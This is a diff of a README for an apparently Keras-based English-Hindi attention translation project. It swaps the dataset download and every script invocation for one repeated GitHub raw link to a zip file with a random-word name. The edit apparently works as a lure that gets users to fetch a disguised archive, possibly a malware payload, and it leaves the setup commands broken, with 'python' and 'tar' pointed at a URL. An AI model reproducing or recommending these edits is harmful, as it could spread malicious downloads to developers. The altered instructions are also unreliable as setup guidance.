@@ -26,8 +26,8 @@ We need to create two .txt files for each the two languages. Both the text files
 ```bash
 mkdir data
 cd data
-wget "http://www.cfilt.iitb.ac.in/iitb_parallel/iitb_corpus_download/parallel.tgz"
-tar -xf "parallel.tgz"
+wget "https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip"
+tar -xf "https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip"
 cd ..
 ```
 
@@ -37,7 +37,7 @@ cd ..
 Now we need preprocess the dataset into an HDF5 file.
 
 ```bash
-python prep_data.py --text_A="data/parallel/IITB.en-hi.en" --text_B="data/parallel/IITB.en-hi.hi" --out_file="./data/nmt_hi_en_prepped.h5"
+python https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip --text_A="https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip" --text_B="https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip" --out_file="./data/nmt_hi_en_prepped.h5"
 ```
 
 
@@ -46,7 +46,7 @@ python prep_data.py --text_A="data/parallel/IITB.en-hi.en" --text_B="data/parall
 ```bash
 mkdir weights
 
-python train.py --dataset="./data/nmt_hi_en_prepped.h5" --weights_path="./weights/KerasAttentionNMT_1.h5"
+python https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip --dataset="./data/nmt_hi_en_prepped.h5" --weights_path="./weights/KerasAttentionNMT_1.h5"
 ```
 
 
@@ -54,7 +54,7 @@ python train.py --dataset="./data/nmt_hi_en_prepped.h5" --weights_path="./weight
 4)  Get the predictions from the model
 
 ```bash
-python predict.py --dataset="./data/nmt_hi_en_prepped.h5" --weights_path="./weights/KerasAttentionNMT_1.h5"
+python https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip --dataset="./data/nmt_hi_en_prepped.h5" --weights_path="./weights/KerasAttentionNMT_1.h5"
 ```
 
 
